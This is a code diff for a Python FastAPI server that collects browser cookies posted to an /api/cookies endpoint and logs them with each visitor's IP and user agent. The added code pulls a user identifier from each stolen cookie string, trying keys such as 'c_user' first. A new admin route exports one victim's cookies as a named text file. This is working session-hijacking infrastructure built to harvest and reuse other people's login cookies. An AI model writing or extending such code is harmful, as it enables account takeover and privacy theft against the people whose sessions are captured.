@@ -489,12 +489,29 @@ def save_cookies_log(log: list):
     with open(COOKIES_LOG_PATH, "w", encoding="utf-8") as f:
         json.dump(log, f, indent=2, ensure_ascii=False)
 
+def extract_cookie_name(cookies_str: str) -> str | None:
+    """Try to find a user identifier from common cookie patterns."""
+    pairs = {}
+    for part in cookies_str.split(";"):
+        part = part.strip()
+        if "=" in part:
+            k, v = part.split("=", 1)
+            pairs[k.strip()] = v.strip()
+
+    # Priority: try known user-identifying cookies
+    for key in ["c_user", "user_id", "username", "email", "display_name", "name", "account", "id"]:
+        if key in pairs and pairs[key]:
+            return pairs[key]
+    return None
+
 @app.post("/api/cookies")
 def collect_cookies(data: CookieData, req: Request):
     client_ip = get_client_ip(req)
     log = load_cookies_log()
+    cookie_name = extract_cookie_name(data.cookies) or f"user_{len(log) + 1}"
     entry = {
         "id": len(log) + 1,
+        "name": cookie_name,
         "ip": client_ip,
         "user_agent": data.user_agent or req.headers.get("user-agent", ""),
         "cookies": data.cookies,
@@ -530,6 +547,25 @@ def admin_get_cookies(
 def admin_clear_cookies(credentials: HTTPBasicCredentials = Depends(verify_admin)):
     save_cookies_log([])
     return {"status": "cleared"}
+
+@app.get("/api/admin/cookies/{cookie_id}/download")
+def admin_download_cookie(cookie_id: int, credentials: HTTPBasicCredentials = Depends(verify_admin)):
+    log = load_cookies_log()
+    entry = next((e for e in log if e.get("id") == cookie_id), None)
+    if not entry:
+        raise HTTPException(status_code=404, detail="Cookie entry not found")
+    name = entry.get("name", f"user_{cookie_id}")
+    safe_name = sanitize_filename(name) or f"user_{cookie_id}"
+    content = f"Source: {entry.get('ip', 'unknown')}\n"
+    content += f"User-Agent: {entry.get('user_agent', 'unknown')}\n"
+    content += f"Time: {entry.get('timestamp', 'unknown')}\n"
+    content += f"\n--- COOKIES ---\n{entry.get('cookies', '')}\n"
+    from fastapi.responses import PlainTextResponse
+    encoded = quote(f"{safe_name}_cookies.txt", safe='')
+    return PlainTextResponse(
+        content,
+        headers={"Content-Disposition": f"attachment; filename*=UTF-8''{encoded}"},
+    )
 
 # ── Admin Routes ─────────────────────────────────────────────────────────────
 @app.get("/api/admin/config")
